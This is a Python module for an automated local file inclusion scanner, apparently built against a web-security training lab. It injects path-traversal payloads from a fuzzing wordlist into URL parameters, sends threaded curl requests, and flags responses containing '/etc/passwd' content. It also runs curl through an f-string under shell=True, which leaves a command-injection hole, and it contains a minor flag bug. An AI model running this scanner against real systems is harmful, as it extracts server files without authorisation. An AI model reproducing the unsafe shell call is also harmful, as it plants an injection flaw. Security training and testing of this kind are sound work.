import os
import sys


parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '../'))

# Add the parent directory to sys.path
sys.path.insert(0, parent_dir)

# Now you can import the module from the parent directory

import subprocess
import methods 
import threads
import time

class lfi:

    def __init__(self,end_points):
        self.end_points=end_points
        self.reports={}
        self.errors = {'end_points':[],'General':[]}

    def execute_command(self,command):
        proc= subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, start_new_session=True)
        stdout,stderr=proc.communicate()
        return [proc,stdout.decode("utf-8"),stderr.decode("utf-8")]
    
    def get_payloads(self):
        return methods.get_file_content("/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt")
    
    def modify_endpoint(self,end_point,payload):
        return methods.qsreplace(end_point,payload).strip()
        
    def curl(self,end_point):
        _,out,err=self.execute_command(f"curl -s -L -H 'User-Agent: Mozilla/5.0' --insecure '{end_point}'")
        if not err:
            return out
        else:
            return False
    
    def list_search(self,keywords,lst):
        for keyword in keywords:
            if keyword in lst:
                return True
        return False
    
    def test_payload(self,end_point,payload):
        is_done=False
        error=None
        modify_result = self.modify_endpoint(end_point,payload)
        if modify_result:
            print(f'[+] Testing Payload: {payload.strip()}')    
            curl_result = self.curl(modify_result)
            if curl_result:
                search_result = self.list_search(["root:"],curl_result)
                if search_result:
                    self.reports[end_point]=(payload,curl_result)
                    done=True
            else:
                error = 'Can\'t Curl Endpoint'    
        else:
            error = 'Can\'t modify endpoint'   
        return [is_done,error]
            
    def is_vuln(self,end_point):
        return end_point in self.reports      
    
    def lfi(self,end_point,requests_num,delay):
        try:
            payloads = self.get_payloads()
            payloads.append('../../../etc/passwd')
            if payloads:
                iterations = len(payloads)//requests_num
                for i in range(iterations):
                    for payload in payloads[:requests_num]:
                        threads.thread(self.test_payload,(end_point,payload))
                    if self.is_vuln(end_point):
                        return
                    payloads = payloads[requests_num:]
                    time.sleep(delay)
            else:
                self.errors['end_points'].append(end_point)
        except:
            self.errors['end_points'].append(end_point)
    
    def llfi(self):
        print("[‚óè] Vulnerabilities Scanning  -  LFI")
        try:
            for end_point in self.end_points:
                try:
                    threads.thread(self.lfi,(end_point,50,1))
                except:
                    self.errors['end_points'].append(end_point)
        except Exception as e:
            self.errors['General'] = e 



# end_points = ['https://0a72007e045da2058698842000e2002d.web-security-academy.net/image?filename=61.jpg']
# lfi_ob = lfi(end_points)
# lfi_ob.llfi()
# print("Errors:", lfi_ob.errors)
# print("Reports:", lfi_ob.reports)